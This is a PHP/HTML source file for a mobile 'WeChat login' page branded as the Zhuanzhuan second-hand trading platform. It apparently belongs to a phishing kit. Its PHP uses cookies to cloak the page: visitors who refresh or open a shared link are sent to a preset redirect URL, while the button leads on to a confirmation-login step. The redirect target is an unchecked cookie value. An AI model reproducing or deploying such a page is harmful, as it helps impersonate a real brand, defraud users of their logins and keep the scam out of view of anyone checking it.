
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');

//先重新将商品ID写入另一个命名的COOKIE中，然后再销毁商品页生成的商品ID的COOKIE
setcookie('GoodsID2',$_COOKIE['GoodsID']);
setcookie("GoodsID");
//判断在商品页传过来的COOKIE是否存在(此页面是登陆页面，属于安全系数，所以用于防止客户刷新依然停留或者发给其他用户看)
//如果发给用户看，COOKIE中的URL地址不存在，就返回设定好的跳转地址
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID']){
	   header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}
?>

<title>微信登录</title>
<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon"/>
<meta content="yes" name="apple-mobile-web-app-capable">
<meta content="black" name="apple-mobile-web-app-status-bar-style">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="styleSheet" href="style2/css/detail_1x.css">
<meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
<meta name="aplus-waiting" content="1">
<meta name="data-spm" content="a1z3i">
<link rel="stylesheet" href="style2/css/mo.css">
<style type="text/css"></style></head>
<body>
<div class="clear"></div>
<div style="margin-top:110px; margin-bottom:10px; background:#fff; font-weight:bold">
    <div style="margin-top:50px; text-align:center; line-height:30px; font-size:14px">
        <img src="style2/img/mipush_notification.gif" width="120" />
 
        <div class="submit" style="margin-top:90px">
            <button type="submit"  class="button" id="submit-btn" style="background:#f55; border:none; height:35px; line-height:35px; font-size:14px; " onClick="location.href='confirm_login.php';">登录开启转转世界</button>
        </div>
            <div style=" text-align:left; padding:8px 10px 0px 10px">
            <span style="color:#ccc">阅读并接受</span>《转转使用条约与规范》
            </div>
         <div style="text-align:left;padding: 50% 0px 0px 20%;">
         <span style="color:#ccc">   腾讯投资-更专业的闲置二手交易平台</span></div>
         </div>
</body></html>
